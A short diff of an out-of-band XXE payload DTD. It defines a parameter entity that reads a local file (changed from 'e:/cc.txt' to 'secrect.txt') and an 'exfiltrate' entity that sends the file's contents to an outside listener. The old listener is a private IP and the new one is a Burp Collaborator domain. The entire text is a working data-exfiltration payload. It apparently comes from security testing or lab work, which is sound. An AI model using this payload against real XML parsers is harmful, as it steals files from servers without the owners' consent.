@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///e:/cc.txt">
-        <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://192.168.56.17/%file;'>">
+<!ENTITY % file SYSTEM "file:///secrect.txt">
+        <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://79e8z5whrxw4bppu0puwn97x0o6eu3.burpcollaborator.net/%file;'>">
         %eval;
         %exfiltrate;
